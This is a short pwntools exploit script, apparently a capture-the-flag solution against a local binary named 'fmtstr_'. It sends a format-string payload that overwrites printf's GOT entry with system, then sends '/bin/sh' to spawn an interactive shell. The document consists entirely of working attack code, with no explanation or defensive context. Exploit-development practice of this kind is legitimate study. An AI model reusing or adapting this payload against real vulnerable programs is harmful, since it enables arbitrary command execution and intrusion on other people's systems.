from pwn import *
context(log_level='debug',os='linux',arch='i386')
pwnfile = './fmtstr_'
io=process(pwnfile)

elf = ELF(pwnfile)

printf_got = elf.got['printf']
system = elf.plt['system']
offset = 7
payload=fmtstr_payload(offset,{printf_got:system}) 
print("payload--->",payload)


io.sendline(payload)
io.sendline(b'/bin/sh\x00')
io.interactive()
